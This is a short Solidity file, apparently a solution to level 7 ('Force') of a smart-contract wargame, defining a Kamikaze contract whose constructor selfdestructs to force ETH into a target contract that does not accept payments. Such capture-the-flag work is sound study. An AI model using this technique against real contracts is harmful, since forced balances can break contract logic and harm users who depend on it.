// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 7. FORCE
 * @dev Find a way to send ETH to the contract to complete this level.
 */

contract Kamikaze {
    // Selfdestruct the contract will force send all the contract's balance to the target address
    constructor(address payable _target) payable {
        require(msg.value > 0, "Kamikaze need some ETH to attack");
        selfdestruct(_target);
    }
}
